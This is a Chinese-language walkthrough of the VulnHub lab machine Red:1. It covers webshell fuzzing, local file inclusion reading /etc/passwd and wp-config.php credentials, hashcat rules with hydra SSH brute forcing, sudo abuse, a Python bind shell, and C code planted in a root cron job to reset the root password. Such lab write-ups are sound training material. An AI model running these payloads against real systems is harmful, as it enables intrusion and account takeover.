[https://www.vulnhub.com/entry/red-1,753/](https://www.vulnhub.com/entry/red-1,753/)

在`/etc/hosts`中添加`192.168.56.101	redrocks.win`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201161205693.png)

---

wordpress

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201161206777.png)

wpscan没扫出来啥结果

在[http://redrocks.win/2021/10/24/hello-world/](http://redrocks.win/2021/10/24/hello-world/)有一句话`Still Looking For It? Maybe you should ask Mr. Miessler for help, not that it matters, you won't be able to read anything with it anyway`

发现其是[SecLists](https://github.com/danielmiessler/SecLists)的作者

用wfuzz配合seclists对网站后门进行扫描`wfuzz -w Discovery/Web-Content/CommonBackdoors-PHP.fuzz.txt -u http://192.168.56.101/FUZZ --hc 404`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201161533616.png)

要对这个webshell的使用参数进行爆破`wfuzz -w ./Discovery/Web-Content/burp-parameter-names.txt -u "http://192.168.56.101/NetworkFileManagerPHP.php?FUZZ"`

fuzz出的结果为`key`,`NetworkFileManagerPHP.php?key=../../../../../../../etc/passwd`回显了`/etc/passwd`的结果,推测其为文件包含

```
john:x:1000:1000:john:/home/john:/bin/bash
ippsec:x:1001:1001:,,,:/home/ippsec:/bin/bash
oxdf:x:1002:1002:,,,:/home/oxdf:/bin/bash
```

`NetworkFileManagerPHP.php?key=php://filter/read=convert.base64-encode/resource=index.php`成功读出`index.php`的内容

```python
import requests
import base64

url="http://192.168.56.101/NetworkFileManagerPHP.php?key=php://filter/read=convert.base64-encode/resource="
filename="./index.php"

r=requests.get(url=url+filename)
print(base64.b64decode(r.text).decode("utf-8"))
```

`NetworkFileManagerPHP.php`

```php
<?php
   $file = $_GET['key'];
   if(isset($file))
   {
       include("$file");
   }
   else
   {
       include("NetworkFileManagerPHP.php");
   }
   /* VGhhdCBwYXNzd29yZCBhbG9uZSB3b24ndCBoZWxwIHlvdSEgSGFzaGNhdCBzYXlzIHJ1bGVzIGFyZSBydWxlcw== */
?>
```

```
$ echo "VGhhdCBwYXNzd29yZCBhbG9uZSB3b24ndCBoZWxwIHlvdSEgSGFzaGNhdCBzYXlzIHJ1bGVzIGFyZSBydWxlcw==" | base64 -d
That password alone won't help you! Hashcat says rules are rules
```

`wp-config.php`

```php
<?php

define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'john' );

/** MySQL database password */
define( 'DB_PASSWORD', 'R3v_m4lwh3r3_k1nG!!' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

define('FS_METHOD', 'direct');

define('WP_SITEURL', 'http://redrocks.win');
define('WP_HOME', 'http://redrocks.win');


define('AUTH_KEY',         '2uuBvc8SO5{>UwQ<^5V5[UHBw%N}-BwWqw|><*HfBwJ( $&%,(Zbg/jwFkRHf~v|');
define('SECURE_AUTH_KEY',  'ah}<I`52GL6C^@~x C9FpMq-)txgOmA<~{R5ktY/@.]dBF?keB3}+Y^u!a54 Xc(');
define('LOGGED_IN_KEY',    '[a!K}D<7-vB3Y&x_<3e]Wd+J]!o+A:U@QUZ-RU1]tO@/N}b}R@+/$+u*pJ|Z(xu-');
define('NONCE_KEY',        ' g4|@~:h,K29D}$FL-f/eujw(VT;8wa7xRWpVR: >},]!Ez.48E:ok 8Ip~5_o+a');
define('AUTH_SALT',        'a;,O<~vbpL+|@W+!Rs1o,T$r9(LwaXI =I7ZW$.Z[+BQ=B6QG7nr+w_bQ6B]5q4c');
define('SECURE_AUTH_SALT', 'GkU:% Lo} 9}w38i:%]=uq&J6Z&RR#v2vsB5a_ +.[us;6mE+|$x*+ D*Ke+:Nt:');
define('LOGGED_IN_SALT',   '#`F9&pm_jY}N3y0&8Z]EeL)z,$39,yFc$Nq`jGOMT_aM*`<$9A:9<Kk^L}fX@+iZ');
define('NONCE_SALT',       'hTlFE*6zlZMbqluz)hf:-:x-:l89fC4otci;38|i`7eU1;+k[!0[ZG.oCt2@-y3X');

...
```

尝试利用`john R3v_m4lwh3r3_k1nG!!`进行ssh连接,但是失败了,尝试去读三个用户下的`.ssh`目录中的内容也失败了

最后结合题目提示,尝试用hashcat去进行基于规则的爆破,hashcat的规则位于`/usr/share/hashcat/rules`目录下

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201161619831.png)

用`hydra`去爆破ssh,`hydra -l john -P out.txt 192.168.56.101 ssh`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201161622206.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201161623938.png)

可以利用`/usr/bin/time`切换到`ippsec`用户,`sudo -u ippsec /usr/bin/time /bin/bash`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201161632715.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201161658975.png)

`cat`和`vi`对换了,同时会不定时断开ssh并重置密码

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201161625266.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201161626016.png)

```
ippsec@red:~$ df -h
Filesystem                         Size  Used Avail Use% Mounted on
udev                               447M     0  447M   0% /dev
tmpfs                               99M  1.   98M   2% /run
/dev/mapper/ubuntu--vg-ubuntu--lv   19G   18G     0 100% /
tmpfs                              49     0  49   0% /dev/shm
tmpfs                              5.0M     0  5.0M   0% /run/lock
tmpfs                              49     0  49   0% /sys/fs/cgroup
/dev/loop1                          33M   33M     0 100% /snap/snapd/12704
/dev/loop2                          56M   56M     0 100% /snap/core18/2128
/dev/sda2                          976M  107M  803M  12% /boot
/dev/loop3                          68M   68M     0 100% /snap/lxd/21545
/dev/loop4                          33M   33M     0 100% /snap/snapd/13640
/dev/loop0                          62M   62M     0 100% /snap/core20/1169
/dev/loop5                          7   7     0 100% /snap/lxd/21029
/dev/loop6                          56M   56M     0 100% /snap/core18/2246
tmpfs                               99M     0   99M   0% /run/user/1000
```

因此基于用户`ippsec`反弹shell(由于环境限制,我这里只能使用正向绑定)

在`/dev/shm`下有空闲空间并可以进行写入操作,在该目录下放置反弹/绑定的payload

```python
import socket
import subprocess
s1=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s1.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)
s1.bind(("0.0.0.0",9001))
s1.listen(1)
c,a=s1.accept()
while True:
    d=c.recv(1024).decode()
    p=subprocess.Popen(d,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
    c.sendall(p.stdout.read()+p.stderr.read())
```

利用`pspy`找出干扰ssh的进程

```
2022/01/16 11:52:01 CMD: UID=0    PID=13946  | /bin/sh -c /usr/bin/bash /root/defense/talk.sh
2022/01/16 11:52:01 CMD: UID=0    PID=13947  | /bin/sh -c /usr/bin/bash /root/defense/backdoor.sh
2022/01/16 11:52:01 CMD: UID=0    PID=13949  | /usr/lib/gcc/x86_64-linux-gnu/9/cc1 -quiet -imultiarch x86_64-linux-gnu /var/www/wordpress/.git/supersecretfileuc.c -quiet -dumpbase supersecretfileuc.c -mtune=generic -march=x86-64 -auxbase supersecretfileuc -fasynchronous-unwind-tables -fstack-protector-strong -Wformat -Wformat-security -fstack-clash-protection -fcf-protection -o /tmp/ccKExZsS.s
2022/01/16 11:52:01 CMD: UID=0    PID=13948  | /usr/bin/gcc /var/www/wordpress/.git/supersecretfileuc.c -o /var/www/wordpress/.git/rev
2022/01/16 11:52:01 CMD: UID=0    PID=13950  | as --64 -o /tmp/ccE4jk1U.o /tmp/ccKExZsS.s
2022/01/16 11:52:01 CMD: UID=0    PID=13951  | /usr/lib/gcc/x86_64-linux-gnu/9/collect2 -plugin /usr/lib/gcc/x86_64-linux-gnu/9/liblto_plugin.so -plugin-opt=/usr/lib/gcc/x86_64-linux-gnu/9/lto-wrapper -plugin-opt=-fresolution=/tmp/ccBYe0qS.res -plugin-opt=-pass-through=-lgcc -plugin-opt=-pass-through=-lgcc_s -plugin-opt=-pass-through=-lc -plugin-opt=-pass-through=-lgcc -plugin-opt=-pass-through=-lgcc_s --build-id --eh-frame-hdr -m elf_x86_64 --hash-style=gnu --as-needed -dynamic-linker /lib64/ld-linux-x86-64.so.2 -pie -z now -z relro -o /var/www/wordpress/.git/rev /usr/lib/gcc/x86_64-linux-gnu/9/../../../x86_64-linux-gnu/Scrt1.o /usr/lib/gcc/x86_64-linux-gnu/9/../../../x86_64-linux-gnu/crti.o /usr/lib/gcc/x86_64-linux-gnu/9/crtbeginS.o -L/usr/lib/gcc/x86_64-linux-gnu/9 -L/usr/lib/gcc/x86_64-linux-gnu/9/../../../x86_64-linux-gnu -L/usr/lib/gcc/x86_64-linux-gnu/9/../../../../lib -L/lib/x86_64-linux-gnu -L/lib/../lib -L/usr/lib/x86_64-linux-gnu -L/usr/lib/../lib -L/usr/lib/gcc/x86_64-linux-gnu/9/../../.. /tmp/ccE4jk1U.o -lgcc --push-state --as-needed -lgcc_s --pop-state -lc -lgcc --push-state --as-needed -lgcc_s --pop-state /usr/lib/gcc/x86_64-linux-gnu/9/crtendS.o /usr/lib/gcc/x86_64-linux-gnu/9/../../../x86_64-linux-gnu/crtn.o
2022/01/16 11:52:01 CMD: UID=0    PID=13952  | /usr/bin/ld -plugin /usr/lib/gcc/x86_64-linux-gnu/9/liblto_plugin.so -plugin-opt=/usr/lib/gcc/x86_64-linux-gnu/9/lto-wrapper -plugin-opt=-fresolution=/tmp/ccBYe0qS.res -plugin-opt=-pass-through=-lgcc -plugin-opt=-pass-through=-lgcc_s -plugin-opt=-pass-through=-lc -plugin-opt=-pass-through=-lgcc -plugin-opt=-pass-through=-lgcc_s --build-id --eh-frame-hdr -m elf_x86_64 --hash-style=gnu --as-needed -dynamic-linker /lib64/ld-linux-x86-64.so.2 -pie -z now -z relro -o /var/www/wordpress/.git/rev /usr/lib/gcc/x86_64-linux-gnu/9/../../../x86_64-linux-gnu/Scrt1.o /usr/lib/gcc/x86_64-linux-gnu/9/../../../x86_64-linux-gnu/crti.o /usr/lib/gcc/x86_64-linux-gnu/9/crtbeginS.o -L/usr/lib/gcc/x86_64-linux-gnu/9 -L/usr/lib/gcc/x86_64-linux-gnu/9/../../../x86_64-linux-gnu -L/usr/lib/gcc/x86_64-linux-gnu/9/../../../../lib -L/lib/x86_64-linux-gnu -L/lib/../lib -L/usr/lib/x86_64-linux-gnu -L/usr/lib/../lib -L/usr/lib/gcc/x86_64-linux-gnu/9/../../.. /tmp/ccE4jk1U.o -lgcc --push-state --as-needed -lgcc_s --pop-state -lc -lgcc --push-state --as-needed -lgcc_s --pop-state /usr/lib/gcc/x86_64-linux-gnu/9/crtendS.o /usr/lib/gcc/x86_64-linux-gnu/9/../../../x86_64-linux-gnu/crtn.o
2022/01/16 11:52:02 CMD: UID=0    PID=13953  | /var/www/wordpress/.git/./rev
2022/01/16 11:55:01 CMD: UID=0    PID=13981  | /bin/sh -c /usr/bin/bash /root/defense/change_pass.sh
2022/01/16 11:55:01 CMD: UID=0    PID=13982  | /bin/sh -c /usr/bin/bash /root/defense/kill_sess.sh
2022/01/16 11:55:01 CMD: UID=0    PID=13983  | /bin/sh -c /usr/bin/bash /root/defense/talk.sh
2022/01/16 11:55:01 CMD: UID=0    PID=13984  | /usr/bin/bash /root/defense/kill_sess.sh
2022/01/16 11:55:01 CMD: UID=0    PID=13986  | /usr/bin/bash /root/defense/change_pass.sh
2022/01/16 11:55:01 CMD: UID=0    PID=13985  | /usr/bin/bash /root/defense/change_pass.sh
```

主要有以下关键信息

1. `/bin/sh -c /usr/bin/bash /root/defense/talk.sh`

2. `/bin/sh -c /usr/bin/bash /root/defense/backdoor.sh`

3. `/usr/lib/gcc/x86_64-linux-gnu/9/cc1 -quiet -imultiarch x86_64-linux-gnu /var/www/wordpress/.git/supersecretfileuc.c`

4. `/usr/bin/gcc /var/www/wordpress/.git/supersecretfileuc.c -o /var/www/wordpress/.git/rev`

5. `/bin/sh -c /usr/bin/bash /root/defense/change_pass.sh`

6. `/usr/bin/bash /root/defense/kill_sess.sh`

重点关注`/var/www/wordpress/.git/`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201161757778.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201161958973.png)

由于空间不足,把exp放在`/dev/shm`中,用`ln -s`连接

```cpp
#include <stdio.h>
#include <stdlib.h>
int main()
{
    system("tar -czvf /dev/shm/root.tar /root/defense");
    system("chmod 777 /dev/shm/root.tar");
    return 0;
}
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201162025582.png)

backdoor.sh

```bash
#!/bin/bash

/usr/bin/gcc /var/www/wordpress/.git/supersecretfileuc.c -o /var/www/wordpress/.git/rev && /var/www/wordpress/.git/./rev
```

change_pass.sh

```bash
#!/bin/bash
n=$((1 + $RANDOM % 7))

if [ $n -eq 1 ]; then
        echo "john:R3v_m4lwh3r3_k1nG!!0" | /usr/sbin/chpasswd

elif [ $n -eq 2 ]; then
        echo "john:!!Gn1k_3r3hwl4m_v3R" | /usr/sbin/chpasswd

elif [ $n -eq 3 ]; then
        echo "john:R3v_m4lwh3r3_k1nG!!6" | /usr/sbin/chpasswd

elif [ $n -eq 4 ]; then
        echo "john:R3v_m4lwh3r3_k1nG!!00" | /usr/sbin/chpasswd

elif [ $n -eq 5 ]; then
        echo "john:r3v_m4lwh3r3_k1nG!!" | /usr/sbin/chpasswd

elif [ $n -eq 6 ]; then
        echo "john:R3v_m4lwh3r3_k1nG!!02" | /usr/sbin/chpasswd

else
        echo "john:R3v_m4lwh3r3_k1nG!!21" | /usr/sbin/chpasswd

fi
```

kill_sess.sh

```bash
#!/bin/bash

killall -u john
```

talk.sh

```bash
#!/bin/bash
n=$((1 + $RANDOM % 8))

for i in {0..25}
do
        if [ $n -eq 1 ]; then
                echo "You really think you can take down my machine Blue?" > /dev/pts/$i

        elif [ $n -eq 2 ]; then
                echo "You will never see your way to 0xdf" > /dev/pts/$i

        elif [ $n -eq 3 ]; then
                echo "I recommend you leave Blue or I will destroy your shell" > /dev/pts/$i

        elif [ $n -eq 4 ]; then
                echo "You will never win Blue" > /dev/pts/$i

        elif [ $n -eq 5 ]; then
                echo "Red Rules, Blue Drools!" > /dev/pts/$i

	elif [ $n -eq 6 ]; then
                echo "You really think ippsec was the way to go? Silly Blue" > /dev/pts/$i

	elif [ $n -eq 7 ]; then
                echo "Get out of my machine Blue!!" > /dev/pts/$i

        else
                echo "Say Bye Bye to your Shell Blue and that password" > /dev/pts/$i

        fi
done
```

```cpp
#include <stdio.h>
#include <stdlib.h>
int main()
{
    system("echo \"root:root\" | /usr/sbin/chpasswd");
    return 0;
}
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201162042592.png)
